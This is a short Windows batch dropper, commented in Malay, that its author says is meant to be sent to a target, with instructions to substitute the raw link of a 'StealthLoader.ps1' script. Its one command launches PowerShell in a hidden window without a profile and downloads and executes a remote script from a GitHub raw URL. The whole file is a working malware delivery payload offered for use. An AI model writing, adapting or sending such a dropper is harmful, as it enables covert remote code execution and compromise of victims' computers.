@echo off
:: Fail ini untuk dihantar kepada target. Klik ja BOOM.
:: Gantikan URL di bawah dengan Link Raw Gist StealthLoader.ps1 anda.

powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rootcpanel-yoe/313/refs/heads/main/StealthLoader.ps1')"

